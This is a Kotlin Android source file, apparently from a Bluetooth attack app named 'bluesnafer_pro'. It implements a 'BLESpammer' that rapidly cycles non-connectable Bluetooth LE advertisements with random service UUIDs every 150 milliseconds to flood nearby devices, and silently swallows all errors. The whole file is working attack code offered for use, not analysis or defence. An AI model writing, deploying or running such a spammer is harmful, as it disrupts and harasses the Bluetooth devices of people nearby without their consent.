package com.bluesnafer_pro

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.os.Handler
import android.os.Looper
import android.os.ParcelUuid
import java.util.UUID
import java.util.concurrent.Executors

object BLESpammer {
    private var advertiser: BluetoothLeAdvertiser? = null
    private val callbacks = mutableListOf<AdvertiseCallback>()
    private var spamming = false
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var spamTask: java.util.concurrent.ScheduledFuture<*>? = null
    
    fun startSpam(device: BluetoothDevice) {
        try {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null || !adapter.isEnabled) return
            
            advertiser = adapter.bluetoothLeAdvertiser
            spamming = true
            
            spamTask = executor.scheduleAtFixedRate({
                if (!spamming) return@scheduleAtFixedRate
                
                try {
                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setConnectable(false)
                        .setTimeout(0)
                        .build()
                    
                    val data = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .addServiceUuid(ParcelUuid(UUID.randomUUID()))
                        .build()
                    
                    val callback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                            callbacks.add(this)
                        }
                        override fun onStartFailure(errorCode: Int) {}
                    }
                    
                    advertiser?.startAdvertising(settings, data, callback)
                    
                    // Stop after 100ms to allow new advertisement
                    Handler(Looper.getMainLooper()).postDelayed({
                        try { advertiser?.stopAdvertising(callback) } catch (_: Exception) {}
                    }, 100)
                } catch (_: Exception) {}
            }, 0, 150, java.util.concurrent.TimeUnit.MILLISECONDS)
            
        } catch (_: Exception) {}
    }
    
    fun stopSpam() {
        spamming = false
        spamTask?.cancel(true)
        callbacks.forEach { 
            try { advertiser?.stopAdvertising(it) } catch (_: Exception) {}
        }
        callbacks.clear()
    }
}
